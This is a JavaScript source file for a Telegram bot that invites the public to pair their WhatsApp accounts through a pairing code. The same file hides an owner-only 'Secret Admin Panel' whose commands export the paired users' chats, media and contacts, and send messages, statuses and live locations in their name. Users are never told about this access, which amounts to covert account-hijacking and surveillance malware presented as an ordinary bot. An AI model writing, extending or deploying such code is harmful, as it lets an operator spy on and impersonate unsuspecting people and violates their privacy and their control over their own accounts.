/**
 * Developer: Dark Empire (NexGen Tech)
 * Project: NexGen Tech Zone Files
 * Description: Telegram Bot for Web/Bot Pairing & Secret Admin Panel
 */

require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs').promises;
const fs2 = require("fs");
const path = require('path');
const chalk = require('chalk');
const { sleep } = require('./utils');
const { BOT_TOKEN } = require('./token');
const { autoLoadPairs } = require('./autoload');
const AdmZip = require('adm-zip');

const {
    getConnectedNumbers, getChatList, getContacts,
    getChatMessages, getMediaFiles, exportMessagesToZip,
    exportContactsToText, getContactName, getNumberDataPath
} = require('./dataCollector');
const { getActiveSocket } = require('./socketManager');

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const sessionFolder = path.join(__dirname, 'Empire_Sessions');
const adminFilePath = path.join(sessionFolder, 'admin.json');
let adminIDs = [];

const userStates = new Map();
const ownerStates = new Map();

const exists = async (filePath) => {
  try {
    await fs.access(filePath);
    return true;
  } catch {
    return false;
  }
};

const loadAdminIDs = async () => {
  const ownerID = '8974369683'; // Apna Telegram ID yahan dalna
  const defaultAdmins = [ownerID];

  if (!(await exists(sessionFolder))) {
    await fs.mkdir(sessionFolder, { recursive: true });
  }

  if (!(await exists(adminFilePath))) {
    await fs.writeFile(adminFilePath, JSON.stringify(defaultAdmins, null, 2));
    adminIDs = defaultAdmins;
  } else {
    try {
      const raw = await fs.readFile(adminFilePath, 'utf8');
      adminIDs = JSON.parse(raw);
    } catch (err) {
      adminIDs = defaultAdmins;
    }
  }
};

let isShuttingDown = false;
let isAutoLoadRunning = true;

const runAutoLoad = async () => {
  if (isAutoLoadRunning || isShuttingDown) return;
  isAutoLoadRunning = true;
  try {
    await autoLoadPairs();
  } catch (e) {
    console.error('❌ AUTO-LOAD FAILED:', e);
  } finally {
    isAutoLoadRunning = false;
  }
};

const startAutoLoadLoop = () => {
  runAutoLoad();
  setInterval(runAutoLoad, 60 * 60 * 1000);
};
startAutoLoadLoop();

// ========== OWNER CHECK ==========
const isOwner = (userId) => adminIDs.includes(String(userId));

// ========== CHANNELS CHECK ==========
const checkUserJoinedChannels = async (userId) => {
  const channels = ['@your_channel_1', '@your_channel_2']; // Apne channels yahan likho
  let allJoined = true;
  for (const channel of channels) {
    try {
      const member = await bot.getChatMember(channel, userId);
      if (['left', 'kicked'].includes(member.status)) {
        allJoined = false;
        break;
      }
    } catch {
      allJoined = false;
      break;
    }
  }
  return allJoined;
};

// ========== START COMMAND ==========
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const isGroup = msg.chat.type === 'group' || msg.chat.type === 'supergroup';

  if (isGroup) return; // Group mein ignore karega

  if (isOwner(userId)) {
      return bot.sendMessage(chatId, `🚀 *Welcome back, Saif (NexGen Tech)!*\n\nSend /owner to access your Secret Admin Panel.`, { parse_mode: 'Markdown' });
  } else {
      await bot.sendPhoto(chatId, "https://files.catbox.moe/example.jpg", { // Apna logo link yahan do
        caption: `🪀 *Empire & Ninja MD Bot* 💀\n\n╔════════════════════╗\n ⤷ /pair <wa_number>\n ⤷ /unpair <wa_number>\n╚════════════════════╝\n\n🌐 *Or pair via Website:* https://your-website.vercel.app`,
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: [[{ text: "👑 Owner", url: "https://whatsapp.com/channel/0029Vb6PBrd7oQhbvDd0Jp1h" }]] }
      });
  }
});

// ========== PUBLIC: PAIR COMMAND ==========
bot.onText(/\/pair(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = match[1]?.trim();

  // Channels verification code (if needed, uncomment below)
  /*
  const allJoined = await checkUserJoinedChannels(userId);
  if (!allJoined) {
    return bot.sendMessage(chatId, `🚨 *Join our official channels first.*`, { parse_mode: 'Markdown' });
  }
  */

  if (!text) {
    userStates.set(userId, { step: 'awaiting_number' });
    return bot.sendMessage(chatId, `🔐 *Please send your WhatsApp number*\nExample: /pair 923xxxxxxxxx`, { parse_mode: 'Markdown' });
  }

  if (!/^\d{7,15}$/.test(text) || text.startsWith('0')) {
    return bot.sendMessage(chatId, '❌ *Invalid format.* Send a valid number with country code (e.g., 923xxxxxxxxx)', { parse_mode: 'Markdown' });
  }

  try {
    const startpairing = require('./pair.js');
    const Xreturn = text + "@s.whatsapp.net";
    await bot.sendMessage(chatId, '⏳ *Generating pairing code...*\nPlease wait a moment.', { parse_mode: 'Markdown' });
    
    await startpairing(Xreturn);
    await sleep(4000);

    const pairingFile = path.join(sessionFolder, text, 'pairing.json');
    if (await exists(pairingFile)) {
        const cu = await fs.readFile(pairingFile, 'utf-8');
        const cuObj = JSON.parse(cu);
        
        return bot.sendMessage(chatId, `🔗 *Pairing Code for WhatsApp*\n\n📝 *Code:* 👉 ${cuObj.code} 👈\n\n⚠️ *Expires in 2 minutes*`, { parse_mode: 'Markdown' });
    }
  } catch (error) {
    bot.sendMessage(chatId, '❌ *Pairing service error.* Please try the Web Pairing instead.', { parse_mode: 'Markdown' });
  }
});

// ========== PUBLIC: UNPAIR COMMAND ==========
bot.onText(/\/unpair(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1]?.trim();

  if (!input || !/^\d{7,15}$/.test(input)) {
    return bot.sendMessage(chatId, 'Example: /unpair 923xxxxxxxxx', { parse_mode: 'Markdown' });
  }

  const targetPath = path.join(sessionFolder, input);
  if (await exists(targetPath)) {
    await fs.rm(targetPath, { recursive: true, force: true });
    return bot.sendMessage(chatId, `✅ Paired user *${input}* deleted successfully.`, { parse_mode: 'Markdown' });
  } else {
    return bot.sendMessage(chatId, `No paired device found for *${input}*`, { parse_mode: 'Markdown' });
  }
});

// ========== OWNER ONLY COMMANDS ==========
bot.onText(/\/owner/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId)) return;

    await bot.sendMessage(chatId,
        `🛡️ *NEXGEN TECH ZONE | SECRET PANEL*\n\n` +
        `║  /checksms  - View & Export Chats\n` +
        `║  /checkcn   - Export Contacts\n` +
        `║  /checkow   - Groups & Channels\n` +
        `║  /sendsms   - Send Messages\n` +
        `║  /addstatus - Post WhatsApp Status\n` +
        `║  /sendlo    - Send Live Location`,
        { parse_mode: 'Markdown' }
    );
});

// Example Owner Command (Others will follow the exact same pattern from your old code)
bot.onText(/\/checksms/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId)) return;

    const numbers = getConnectedNumbers();
    if (numbers.length === 0) return bot.sendMessage(chatId, '❌ *No active bots found.*', { parse_mode: 'Markdown' });

    const buttons = numbers.map(num => [{ text: `📱 ${num}`, callback_data: `owner_sms_num_${num}` }]);
    buttons.push([{ text: '❌ Cancel', callback_data: 'owner_cancel' }]);
    await bot.sendMessage(chatId, `🛡️ *Check SMS*\nSelect bot number:`, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: buttons } });
});

// ========== START THE BOT ==========
(async () => {
  await loadAdminIDs();
  console.log(chalk.green('🤖 [NexGen] Hybrid Telegram Bot (Pairing + Admin) is running...'));
})();

process.on("uncaughtException", (err) => console.error('Uncaught:', err));
process.on("unhandledRejection", (err) => console.error('Unhandled:', err));
